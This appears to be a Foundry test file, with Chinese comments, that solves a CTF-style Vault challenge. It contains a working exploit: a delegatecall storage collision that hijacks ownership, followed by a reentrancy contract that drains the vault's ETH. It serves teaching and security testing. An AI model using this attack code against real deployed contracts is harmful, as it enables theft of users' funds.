// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

/**
 * @title Vault 安全漏洞演示测试
 * @dev 测试Vault合约的安全漏洞利用
 *
 * 漏洞利用说明：
 *
 * 漏洞1：存储冲突 + 访问控制绕过
 * - Vault通过delegatecall代理VaultLogic执行
 * - VaultLogic的changeOwner函数在Vault上下文中执行时
 * - 会修改Vault存储中的owner变量，而非VaultLogic中的owner
 * - 攻击者利用此特性将Vault.owner改为自己的地址
 *
 * 漏洞2：重入攻击
 * - withdraw()函数使用低级的.call()而非safeTransfer
 * - 先转账后清零状态变量（违反CEI模式）
 * - 攻击者可以在receive()中重入withdraw()函数
 *
 * 攻击步骤：
 * 1. 利用delegatecall漏洞修改Vault.owner
 * 2. 调用openWithdraw()开启提款
 * 3. 部署攻击合约进行重入攻击
 * 4. 提取Vault中所有资金
 */
contract VaultExploiter is Test {
    /// @dev Vault代理合约实例
    Vault public vault;

    /// @dev VaultLogic逻辑合约实例
    VaultLogic public logic;

    // ==================== 测试地址 ====================
    /// @dev 初始所有者地址
    address public owner = address(1);

    /// @dev 攻击者/玩家地址
    address public player = address(2);

    /**
     * @dev 测试前置设置
     *
     * 初始化流程：
     * 1. 给owner充值1 ETH
     * 2. 部署VaultLogic（密码设为address(logic)的bytes32形式）
     * 3. 部署Vault代理合约
     * 4. owner存入0.1 ETH
     */
    function setUp() public {
        // 给owner充值1 ETH用于测试
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        // 部署逻辑合约，密码为address(logic)的bytes32形式
        // 注意：这里是一个"巧合"密码，用于教学演示
        logic = new VaultLogic(bytes32("0x1234"));
        // 部署代理合约
        vault = new Vault(address(logic));

        // owner存入0.1 ETH
        vault.deposit{value: 0.1 ether}();
        vm.stopPrank();
    }

    /**
     * @dev 测试漏洞利用
     *
     * 攻击流程：
     * 1. 攻击者（player）获得攻击资金
     * 2. 通过Vault的fallback调用VaultLogic的changeOwner
     *    - 密码是address(logic)的bytes32形式（这是漏洞设计的一部分）
     *    - 由于delegatecall，会修改Vault.storage中的owner
     * 3. 现在player成为了Vault.owner
     * 4. 调用openWithdraw()开启提款功能
     * 5. 创建ReentrancyAttack攻击合约
     * 6. 攻击合约存款0.01 ETH并调用withdraw()
     * 7. 由于重入漏洞，可以提取Vault中所有资金
     *
     * 预期结果：vault.isSolve()返回true，表示Vault余额为0
     */
    function testExploit() public {
        // 攻击者获得1 ETH用于攻击
        vm.deal(player, 1 ether);
        vm.startPrank(player);

        // ==================== 步骤1：利用delegatecall漏洞 ====================
        // 密码设置为address(logic)的bytes32形式
        // 这是一个"巧合"密码，演示存储布局漏洞
        bytes32 password = bytes32(uint256(uint160(address(logic))));

        // 通过Vault的fallback调用VaultLogic的changeOwner
        // 由于delegatecall，会修改Vault.storage中的owner
        (bool success,) = address(vault).call(
            abi.encodeWithSignature("changeOwner(bytes32,address)", password, player)
        );

        // ==================== 步骤2：开启提款 ====================
        // 现在player是Vault.owner，可以调用openWithdraw()
        vault.openWithdraw();

        // ==================== 步骤3：部署攻击合约进行重入攻击 ====================
        ReentrancyAttack attacker = new ReentrancyAttack(payable(address(vault)));
        // 攻击者存入0.01 ETH并触发攻击
        attacker.attack{value: 0.01 ether}();

        // ==================== 验证攻击结果 ====================
        // 验证Vault已被"解决"（余额为0）
        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}

/**
 * @title 重入攻击合约
 * @dev 利用Vault.withdraw()函数的重入漏洞进行攻击
 *
 * 攻击原理：
 * 1. attack()函数先存款0.01 ETH
 * 2. 调用vault.withdraw()
 * 3. Vault先转账ETH到本合约
 * 4. receive()被触发，此时Vault余额仍>0
 * 5. 在receive()中再次调用vault.withdraw()
 * 6. 由于withdraw()先转账后清零，本合约可以重复提取
 * 7. 最终提取Vault中所有资金
 *
 * 安全教训：
 * - 使用Checks-Effects-Interactions模式
 * - 使用reentrancyGuard防止重入
 * - 使用safeTransfer而非低级call
 */
contract ReentrancyAttack {
    /// @dev 被攻击的Vault合约实例
    Vault private vault;

    /**
     * @dev 构造函数
     * @param _vaultAddress Vault合约地址
     */
    constructor(address payable _vaultAddress) {
        vault = Vault(_vaultAddress);
    }

    /**
     * @dev 攻击入口函数
     *
     * 执行流程：
     * 1. 存入0.01 ETH到Vault
     * 2. 调用withdraw()尝试提取
     * 3. 转账剩余资金给调用者
     */
    function attack() external payable {
        // 先存款
        vault.deposit{value: msg.value}();
        // 调用withdraw触发重入
        vault.withdraw();
        // 将攻击收益转给调用者
        payable(msg.sender).transfer(address(this).balance);
    }

    /**
     * @dev 重入回调函数
     *
     * 关键漏洞利用点：
     * - withdraw()先使用.call()转账
     * - 转账后才更新deposites[msg.sender] = 0
     * - 本函数在receive()被触发时可以再次调用withdraw()
     * - 重复提取直到Vault余额为0
     */
    // 重入攻击
    receive() external payable {
        // 如果Vault还有余额，继续提取
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}